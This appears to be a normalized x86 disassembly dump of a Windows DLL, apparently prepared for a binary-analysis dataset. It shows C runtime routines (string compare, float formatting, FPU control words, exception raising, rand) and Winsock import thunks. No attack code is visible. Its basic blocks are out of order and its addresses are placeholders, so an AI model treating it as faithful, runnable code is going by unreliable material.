mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
sub_1000ecd6
push ebp
mov ebp esp
xor eax eax
cmp [ rw-data ] eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_1000eaab
add esp 0x14
pop ebp
retn
sub_1000ed00
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_1000ed61
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
lea esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov edx [ ebp - 0x8 ]
mov ecx edx
mov eax 0x8000
and ecx eax
and edx 0x7fff
test cx cx
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x30 ] 0xcc
mov [ ebp - 0x2f ] 0xcc
mov [ ebp - 0x2e ] 0xcc
mov [ ebp - 0x2d ] 0xcc
mov [ ebp - 0x2c ] 0xcc
mov [ ebp - 0x2b ] 0xcc
mov [ ebp - 0x2a ] 0xcc
mov [ ebp - 0x29 ] 0xcc
mov [ ebp - 0x28 ] 0xcc
mov [ ebp - 0x27 ] 0xcc
mov [ ebp - 0x26 ] 0xfb
mov [ ebp - 0x25 ] 0x3f
mov [ ebp - 0x74 ] 0x1
mov [ ebp - 0x6c ] ecx
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
cmp dx 0x7fff
jne r-xdata
test esi esi
jne r-xdata
test dx dx
mov esi [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
jne r-xdata
movzx ecx dx
mov ebx ecx
imul ecx ecx 0x4d10
shr ebx 0x8
mov eax esi
shr eax 0x18
lea eax [ ebx + eax * 2 ]
imul eax eax 0x4d
lea eax [ eax + ecx - 0x134312f4 ]
sar eax 0x10
movzx ecx ax
movsx ebx cx
mov [ ebp - 0x4c ] ecx
xor eax eax
mov ecx rw-data
neg ebx
sub ecx 0x60
cmp ebx eax
mov [ ebp - 0x16 ] dx
mov [ ebp - 0x1a ] esi
mov [ ebp - 0x1e ] edi
mov [ ebp - 0x20 ] ax
mov [ ebp - 0x68 ] ecx
je r-xdata
mov eax 0x80000000
cmp esi eax
mov [ ebx ] 0x1
jne r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
cmp cx 0x3fff
mov ebx 0x7fff
jb r-xdata
jge r-xdata
test esi 0x40000000
jne r-xdata
test edi edi
je r-xdata
and [ ebx ] di
cmp cx ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ebx + 0x2 ] al
mov [ ebx + 0x3 ] 0x1
mov [ ebx + 0x4 ] 0x30
mov [ ebx + 0x5 ] 0x0
test [ ebp + 0x18 ] 0x1
mov edx [ ebp - 0x60 ]
mov ecx [ ebp - 0x4c ]
mov [ edx ] cx
je r-xdata
mov esi [ ebp - 0x26 ]
inc [ ebp - 0x4c ]
movzx edx cx
mov ecx esi
xor ecx edx
and edx ebx
and esi ebx
and ecx 0x8000
cmp dx bx
lea edi [ esi + edx ]
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
movzx edi di
jae r-xdata
cmp ebx eax
je r-xdata
mov ecx rw-data
neg ebx
sub ecx 0x60
mov [ ebp - 0x68 ] ecx
test cx cx
je r-xdata
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100026a8
leave
retn
push 0x15
pop ecx
cmp [ ebp + 0x14 ] ecx
jle r-xdata
movsx ecx cx
add [ ebp + 0x14 ] ecx
cmp [ ebp + 0x14 ] eax
jg r-xdata
neg cx
sbb ecx ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
cmp si bx
jae r-xdata
add [ ebp - 0x68 ] 0x54
mov ecx ebx
and ecx 0x7
sar ebx 0x3
test ecx ecx
je r-xdata
cmp esi eax
jne r-xdata
cmp esi 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_10009649
add esp 0xc
xor esi esi
test eax eax
je r-xdata
mov esi [ ebp - 0x18 ]
shr esi 0x10
push 0x8
sub esi 0x3ffe
mov [ ebp - 0x16 ] ax
pop ebx
mov [ ebp + 0x14 ] ecx
and [ edx ] 0x0
cmp [ ebp - 0x6c ] 0x8000
mov [ edx + 0x3 ] 0x1
setne al
dec al
and al 0xd
add al 0x20
mov [ edx + 0x2 ] al
mov [ edx + 0x4 ] 0x30
mov [ edx + 0x5 ] 0x0
jmp r-xdata
cmp di 0xbffd
ja r-xdata
test ebx ebx
jne r-xdata
imul ecx ecx 0xc
add ecx [ ebp - 0x68 ]
cmp [ ecx ] 0x8000
mov [ ebp - 0x64 ] ecx
jb r-xdata
push r--data
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebx + 0x3 ] 0x6
push esi
push esi
push esi
push esi
push esi
call sub_10004870
add esp 0x14
mov eax [ ebp - 0x20 ]
mov edi [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shl [ ebp - 0x20 ] 0x1
shr eax 0x1f
add edi edi
or edi eax
mov eax [ ebp - 0x18 ]
shr ecx 0x1f
add eax eax
or eax ecx
dec ebx
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] eax
jne r-xdata
test esi esi
jge r-xdata
xor eax eax
inc eax
jmp r-xdata
cmp di 0x3fbf
ja r-xdata
xor eax eax
movzx edi [ ecx + 0xa ]
mov edx [ ebp - 0x16 ]
xor eax eax
mov ecx edi
mov esi 0x7fff
xor ecx edx
and edx esi
and edi esi
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
and ecx 0x8000
cmp dx si
lea eax [ edi + edx ]
movzx eax ax
jae r-xdata
mov esi ecx
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x3a ]
mov [ ebp - 0x64 ] eax
mov ecx eax
push r--data
push r--data
jmp r-xdata
mov eax [ ebp + 0x14 ]
inc eax
test eax eax
lea ebx [ edx + 0x4 ]
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x4c ] eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
cmp dx ax
jne r-xdata
mov [ ebp - 0x18 ] eax
jmp r-xdata
neg cx
sbb ecx ecx
and [ ebp - 0x1c ] 0x0
and ecx 0x80000000
add ecx 0x7fff8000
and [ ebp - 0x20 ] 0x0
mov [ ebp - 0x18 ] ecx
cmp di si
jae r-xdata
mov [ ebx + 0x3 ] 0x5
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_10004870
add esp 0x14
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_10009649
add esp 0xc
xor esi esi
test eax eax
je r-xdata
dec ebx
mov al [ ebx ]
dec ebx
cmp al 0x35
jge r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl [ ebp - 0x20 ] 0x1
mov edi [ ebp - 0x20 ]
shl [ ebp - 0x20 ] 0x1
shr edx 0x1f
lea ecx [ eax + eax ]
or ecx edx
mov edx [ ebp - 0x18 ]
mov esi eax
shr esi 0x1f
add edx edx
or edx esi
mov eax ecx
lea esi [ ecx + ecx ]
shr eax 0x1f
lea ecx [ edx + edx ]
mov edx [ ebp - 0x3c ]
shr edi 0x1f
or ecx eax
mov eax [ ebp - 0x20 ]
or esi edi
lea edi [ edx + eax ]
cmp edi eax
jb r-xdata
mov eax [ ebp - 0x18 ]
mov edi [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shr [ ebp - 0x18 ] 0x1
shl eax 0x1f
shr edi 0x1
or edi eax
mov eax [ ebp - 0x20 ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
test esi esi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] eax
jg r-xdata
cmp si ax
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
cmp ax 0xbffd
ja r-xdata
xor eax eax
jmp r-xdata
cmp ebx [ ebp - 0x40 ]
jae r-xdata
mov ecx [ ebp - 0x40 ]
jmp r-xdata
lea eax [ esi + 0x1 ]
xor edx edx
cmp eax esi
jb r-xdata
cmp edi edx
jae r-xdata
and [ ebp - 0x54 ] 0x0
lea eax [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc edi
test [ ebp - 0x28 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] eax
jne r-xdata
cmp ax 0x3fbf
ja r-xdata
cmp [ ebx ] 0x39
jne r-xdata
cmp ebx [ ebp - 0x40 ]
mov eax [ ebp - 0x60 ]
jae r-xdata
cmp ebx ecx
jae r-xdata
xor edx edx
inc edx
cmp eax 0x1
jae r-xdata
mov eax [ ebp - 0x38 ]
lea edx [ eax + esi ]
cmp edx esi
mov [ ebp - 0x44 ] edx
jb r-xdata
inc eax
inc eax
inc [ ebp - 0x54 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea esi [ ebp - 0x28 ]
lea edx [ ebp + edx - 0x20 ]
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x48 ] edx
cmp [ ebp - 0x2c ] eax
jne r-xdata
cmp [ ebp - 0x20 ] eax
jne r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov [ ebx ] 0x30
dec ebx
inc [ ebx ]
inc ebx
inc [ eax ]
cmp [ ebx ] 0x30
jne r-xdata
cmp ebx ecx
mov eax [ ebp - 0x60 ]
jae r-xdata
inc ecx
test edx edx
mov esi eax
je r-xdata
inc ecx
cmp edx eax
jae r-xdata
mov edx [ ebp - 0x54 ]
mov esi [ ebp - 0x40 ]
add edx edx
test esi esi
mov [ ebp - 0x50 ] esi
jle r-xdata
add edi 0xc002
xor eax eax
cmp di ax
jle r-xdata
mov [ ebp - 0x44 ] 0x1
cmp ebx edx
jae r-xdata
cmp [ ebp - 0x30 ] eax
je r-xdata
mov [ ebp - 0x16 ] ax
jmp r-xdata
cmp di si
jne r-xdata
inc eax
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
dec ebx
sub bl al
sub bl 0x3
movsx ecx bl
mov [ eax + 0x3 ] bl
mov [ ecx + eax + 0x4 ] 0x0
mov eax [ ebp - 0x74 ]
and [ eax ] 0x0
cmp [ ebp - 0x6c ] 0x8000
mov [ eax + 0x3 ] 0x1
setne dl
dec dl
and dl 0xd
add dl 0x20
mov [ eax + 0x2 ] dl
mov [ ecx ] 0x30
mov [ eax + 0x5 ] 0x0
jmp r-xdata
add ecx [ ebp - 0x34 ]
shr edx 0x1f
add ecx ecx
or ecx edx
lea esi [ edi + edi ]
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x44 ]
mov [ ebp - 0x18 ] ecx
shr ecx 0x18
add esi esi
add cl 0x30
mov eax edi
shr eax 0x1f
or esi eax
mov [ ebx ] cl
inc ebx
dec [ ebp - 0x4c ]
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x15 ] 0x0
jg r-xdata
add edi 0xffff
cmp di ax
jge r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x48 ] 0x2
sub [ ebp - 0x5c ] 0x2
dec [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
jg r-xdata
inc [ eax ]
cmp [ ebp - 0x44 ] 0x0
mov [ eax - 0x4 ] ebx
je r-xdata
lea edi [ ebp - 0xc ]
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x44 ] edi
mov [ ebp - 0x40 ] 0x5
mov edx [ ebp - 0x64 ]
inc eax
test [ edx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] esi
jne r-xdata
cmp [ ebp - 0x10 ] 0x8000
ja r-xdata
mov eax edi
neg eax
movzx eax ax
add edi eax
cmp di ax
jg r-xdata
mov edx [ ebp - 0x10 ]
mov ebx [ ebp - 0xc ]
mov esi [ ebp - 0xc ]
shl [ ebp - 0x10 ] 0x1
shr edx 0x1f
add ebx ebx
or ebx edx
mov edx [ ebp - 0x8 ]
shr esi 0x1f
add edx edx
or edx esi
add edi 0xffff
cmp di ax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] edx
jg r-xdata
mov edx [ ebp - 0x5c ]
mov esi [ ebp - 0x48 ]
movzx esi [ esi ]
movzx edx [ edx ]
and [ ebp - 0x44 ] 0x0
imul edx esi
mov esi [ eax - 0x4 ]
lea ebx [ esi + edx ]
cmp ebx esi
jb r-xdata
inc edi
inc edi
inc [ ebp - 0x5c ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
mov [ ebp - 0x44 ] edi
jg r-xdata
lea edx [ ebp + edx - 0x20 ]
mov [ ebp - 0x58 ] edx
mov edx [ ebp - 0x64 ]
add edx 0x8
mov [ ebp - 0x54 ] edx
cmp [ edx + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x20 ] esi
jne r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x10 ]
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0xc ]
mov esi [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl edx 0x1f
shr ebx 0x1
or ebx edx
mov edx [ ebp - 0x10 ]
shl esi 0x1f
shr edx 0x1
or edx esi
dec eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] edx
jne r-xdata
inc [ ebp - 0x58 ]
mov edx [ ebp - 0x5c ]
mov esi [ ebp - 0x40 ]
add edx edx
test esi esi
mov [ ebp - 0x50 ] esi
jle r-xdata
add eax 0xc002
test ax ax
jle r-xdata
mov [ ebp - 0x70 ] 0x1
cmp esi edx
jae r-xdata
cmp [ edx ] esi
jne r-xdata
mov [ ebp - 0x16 ] si
jmp r-xdata
inc [ ebp - 0xe ]
cmp [ ebp - 0xa ] 0xffffffff
mov [ ebp - 0xe ] eax
jne r-xdata
cmp di 0x7fff
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
xor eax eax
cmp [ ebp - 0x58 ] eax
je r-xdata
add eax 0xffff
test ax ax
jge r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x58 ] 0x2
sub [ ebp - 0x54 ] 0x2
dec [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x70 ] 0x0
mov edi [ ebp - 0x44 ]
mov [ edi - 0x4 ] esi
je r-xdata
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov ax [ ebp - 0xe ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
or edi ecx
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] di
jmp r-xdata
neg cx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
sbb ecx ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
inc [ ebp - 0xa ]
jmp r-xdata
cmp [ ebp - 0x6 ] 0xffff
mov [ ebp - 0xa ] eax
jne r-xdata
or [ ebp - 0x10 ] 0x1
cmp [ ebp - 0x10 ] 0x8000
ja r-xdata
mov edx eax
neg edx
movzx edx dx
mov [ ebp - 0x44 ] edx
add eax edx
test ax ax
jg r-xdata
mov edx [ ebp - 0x10 ]
mov edi [ ebp - 0xc ]
mov esi [ ebp - 0xc ]
shl [ ebp - 0x10 ] 0x1
shr edx 0x1f
add edi edi
or edi edx
mov edx [ ebp - 0x8 ]
shr esi 0x1f
add edx edx
or edx esi
add eax 0xffff
test ax ax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] edx
jg r-xdata
mov edx [ ebp - 0x58 ]
mov esi [ ebp - 0x54 ]
movzx esi [ esi ]
movzx edx [ edx ]
mov edi [ edi - 0x4 ]
imul edx esi
and [ ebp - 0x70 ] 0x0
lea esi [ edi + edx ]
cmp esi edi
jb r-xdata
xor eax eax
jmp r-xdata
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] 0x8000
inc edi
jmp r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x10 ]
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov edx [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov esi [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl edx 0x1f
shr edi 0x1
or edi edx
mov edx [ ebp - 0x10 ]
shl esi 0x1f
shr edx 0x1
or edx esi
dec [ ebp - 0x44 ]
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] edx
jne r-xdata
inc [ ebp - 0x48 ]
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
cmp ax 0x7fff
jae r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x48 ] 0x0
je r-xdata
mov dx [ ebp - 0xe ]
mov [ ebp - 0x20 ] dx
mov edx [ ebp - 0xc ]
mov [ ebp - 0x1e ] edx
mov edx [ ebp - 0x8 ]
or eax ecx
mov [ ebp - 0x1a ] edx
mov [ ebp - 0x16 ] ax
jmp r-xdata
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
cmp [ ebp - 0x6 ] 0xffff
jne r-xdata
or [ ebp - 0x10 ] 0x1
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] 0x8000
inc eax
jmp r-xdata
sub_1000f629
xor eax eax
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
inc eax
test bl 0x4
je r-xdata
or eax 0x4
test bl 0x2
je r-xdata
or eax 0x8
test bl 0x1
je r-xdata
or eax 0x10
test ebx 0x80000
je r-xdata
or eax 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
push esi
mov esi 0x200
je r-xdata
or eax 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or eax 0x400
cmp ecx esi
je r-xdata
retn
or eax 0x1000
test ebx 0x40000
pop esi
je r-xdata
or eax esi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp ecx edx
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_1000f6b7
xor eax eax
test dl 0x10
je r-xdata
test dl 0x8
push ebx
push esi
push edi
mov ebx 0x200
je r-xdata
mov eax 0x80
test dl 0x4
je r-xdata
or eax ebx
test dl 0x2
je r-xdata
or eax 0x400
test dl 0x1
je r-xdata
or eax 0x800
test edx 0x80000
mov edi 0x100
je r-xdata
or eax 0x1000
mov ecx edx
mov esi 0x300
and ecx esi
je r-xdata
or eax edi
mov ecx 0x3000000
pop edi
and edx ecx
cmp edx 0x1000000
pop esi
pop ebx
je r-xdata
cmp ecx edi
je r-xdata
or eax 0x8040
cmp edx 0x2000000
je r-xdata
or eax 0x2000
cmp ecx ebx
je r-xdata
or eax 0x40
retn
cmp edx ecx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp ecx esi
jne r-xdata
retn
or eax 0x8000
retn
or eax 0x6000
jmp r-xdata
sub_1000f757
sub esp 0x10
push ebx
push ebp
push esi
push edi
fwait
fnstcw [ esp + 0x14 ]
mov ebx [ esp + 0x14 ]
xor edx edx
test bl 0x1
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test bl 0x8
je r-xdata
or edx 0x8
test bl 0x10
je r-xdata
or edx 0x4
test bl 0x20
je r-xdata
or edx 0x2
test bl 0x2
je r-xdata
or edx 0x1
movzx ecx bx
mov eax ecx
mov edi 0xc00
and eax edi
mov ebp 0x300
mov esi 0x200
je r-xdata
or edx 0x80000
and ecx ebp
je r-xdata
cmp eax 0x400
je r-xdata
or edx 0x20000
cmp ecx esi
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
mov esi [ esp + 0x28 ]
mov ecx [ esp + 0x24 ]
mov eax esi
not eax
and eax edx
and ecx esi
or eax ecx
cmp eax edx
mov [ esp + 0x1c ] eax
je r-xdata
or edx 0x40000
test bx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx esi
jmp r-xdata
cmp eax edi
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx eax
call sub_1000f629
movzx eax ax
mov [ esp + 0x10 ] eax
fldcw [ esp + 0x10 ]
fwait
fnstcw [ esp + 0x10 ]
mov ebx [ esp + 0x10 ]
xor edx edx
test bl 0x1
je r-xdata
or edx ebp
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
and esi 0x308031f
mov edi esi
stmxcsr [ esp + 0x18 ]
mov eax [ esp + 0x18 ]
xor esi esi
test al al
jns r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test ax 0x200
je r-xdata
push 0x10
pop esi
test bl 0x8
je r-xdata
or edx 0x8
test ax 0x400
je r-xdata
or esi 0x8
test bl 0x10
je r-xdata
or edx 0x4
test ax 0x800
je r-xdata
or esi 0x4
test bl 0x20
je r-xdata
or edx 0x2
test ax 0x1000
je r-xdata
or esi 0x2
test bl 0x2
je r-xdata
or edx 0x1
test ax 0x100
je r-xdata
or esi 0x1
movzx ecx bx
mov eax ecx
and eax edi
je r-xdata
or edx 0x80000
mov ecx eax
mov ebp 0x6000
and ecx ebp
je r-xdata
or esi 0x80000
and ecx ebp
je r-xdata
cmp eax 0x400
je r-xdata
mov ebx 0x8040
and eax ebx
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi 0x100
cmp ecx 0x4000
je r-xdata
mov eax edx
mov [ esp + 0x1c ] edx
or edx 0x40000
test bx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax edi
jne r-xdata
call sub_1000f6b7
push eax
mov [ esp + 0x2c ] eax
call sub_1000fa5a
pop ecx
stmxcsr [ esp + 0x28 ]
mov eax [ esp + 0x28 ]
xor edx edx
test al al
jns r-xdata
mov eax esi
jmp r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebp
jne r-xdata
or edx ebp
jmp r-xdata
mov edi 0x200
test edi eax
je r-xdata
push 0x10
pop edx
mov ecx [ esp + 0x1c ]
mov edx eax
xor edx ecx
or eax ecx
test edx 0x8031f
je r-xdata
mov edx edi
and edi [ esp + 0x24 ]
not edx
and edx esi
or edx edi
cmp edx esi
jne r-xdata
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
test ax 0x400
je r-xdata
or edx 0x8
or eax 0x80000000
test ax 0x800
je r-xdata
or edx 0x4
test ax 0x1000
je r-xdata
or edx 0x2
mov esi 0x100
test esi eax
je r-xdata
or edx 0x1
mov ecx eax
and ecx ebp
je r-xdata
or edx 0x80000
and eax ebx
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x2000000
sub eax 0x7fc0
je r-xdata
or edx esi
cmp ecx 0x4000
je r-xdata
or edx 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or edx edi
jmp r-xdata
cmp ecx ebp
jne r-xdata
mov eax edx
or edx 0x1000000
jmp r-xdata
or edx 0x300
jmp r-xdata
sub_1000fa5a
push 0x8
push r--data
call sub_10005acc
xor eax eax
cmp [ rw-data ] eax
je r-xdata
call sub_10005b11
retn
test [ ebp + 0x8 ] 0x40
je r-xdata
and [ ebp + 0x8 ] 0xffffffbf
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_1000fad2
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
test eax eax
pop edi
mov [ ebp - 0x4 ] eax
pop esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_1000fb1c
push edi
mov edi [ esp + 0x8 ]
mov eax [ edi ]
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ rw-data ] 0x0
push esi
je r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
xor eax eax
push [ rw-data ]
call sub_10004320
mov esi eax
test esi esi
pop ecx
je r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
push esi
call sub_1000fbcd
test eax eax
pop ecx
je r-xdata
call sub_1000cc3f
cmp eax 0x19930521
je r-xdata
push edi
call esi
jmp r-xdata
cmp eax 0x19930522
je r-xdata
pop esi
pop edi
retn 0x4
cmp eax 0x1994000
jne r-xdata
sub_10001bb0
retn
__WSAFDIsSet
jmp [ __WSAFDIsSet@IAT ]
TransmitFile
jmp [ TransmitFile@IAT ]
sub_10002aac
push 0x0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_10002866
add esp 0x10
retn
sub_10002b6c
push 0x0
push [ esp + 0x8 ]
call sub_10002ac3
pop ecx
pop ecx
retn
sub_10002d05
push ecx
mov [ ecx ] r--data
call sub_10005482
pop ecx
retn
sub_10002d13
push esi
mov esi ecx
call sub_10002d05
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_100063a9
pop ecx
sub_10002de9
push [ ebp + 0x8 ]
call sub_100056b1
pop ecx
retn
sub_10002df3
push 0x40
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_10002d2f
add esp 0xc
retn
sub_10002f08
push [ ebp + 0x8 ]
call sub_100056b1
pop ecx
retn
sub_1000310e
push [ ebp + 0x8 ]
call sub_100056b1
pop ecx
retn
sub_100031ff
push esi
call sub_100056b1
pop ecx
retn
sub_100033a4
push [ ebp + 0x14 ]
call sub_100056b1
pop ecx
retn
sub_100033f4
push 0x4
call sub_100071d3
pop ecx
retn
sub_100034c0
call sub_1000452a
mov ecx [ esp + 0x4 ]
mov [ eax + 0x14 ] ecx
retn
sub_100034cd
call sub_1000452a
mov ecx [ eax + 0x14 ]
imul ecx ecx 0x343fd
add ecx 0x269ec3
mov [ eax + 0x14 ] ecx
mov eax ecx
shr eax 0x10
and eax 0x7fff
retn
sub_100037d7
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
push eax
push ecx
call sub_10008b54
pop ecx
pop ecx
retn
_start
cmp [ esp + 0x8 ] 0x1
jne r-xdata
push [ esp + 0x4 ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
call sub_10003704
pop ecx
retn 0xc
call sub_10008b6f
sub_10003bc8
push 0xd
call sub_100071d3
pop ecx
retn
sub_10003f57
push 0xd
call sub_100071d3
pop ecx
retn
sub_10003f90
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_10003df6
pop ecx
mov [ rw-data ] 0x1
sub_100042a8
push 0xc
call sub_100071d3
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_10004317
push 0x0
call sub_100042b4
pop ecx
retn
sub_10004383
call [ TlsAlloc@IAT ]
retn 0x4
sub_1000438c
push [ rw-data ]
call [ TlsGetValue@IAT ]
test eax eax
jne r-xdata
retn
push [ rw-data ]
call sub_10004320
